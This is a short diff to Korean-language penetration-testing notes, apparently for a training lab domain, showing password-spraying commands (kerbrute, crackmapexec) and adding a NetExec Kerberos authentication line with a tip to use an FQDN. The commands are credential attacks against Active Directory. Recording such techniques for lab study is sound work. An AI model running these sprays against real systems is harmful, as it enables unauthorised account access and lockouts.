@@ -218,7 +218,11 @@ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt We
 ```bash
 # SMB를 통한 패스워드 스프레이 (성공한 인증만 표시)
 sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+
+# KERBEROS
+nxc smb <FQDN> -u <user> -p <pass> -k
 ```
+- `KERBEROS` 인증을 시도할 경우 `IP` 대신 `FQDN`을 사용해야 한다.
 
 ### DomainPasswordSpray (PowerShell)
 > PowerShell 기반 패스워드 스프레이 도구
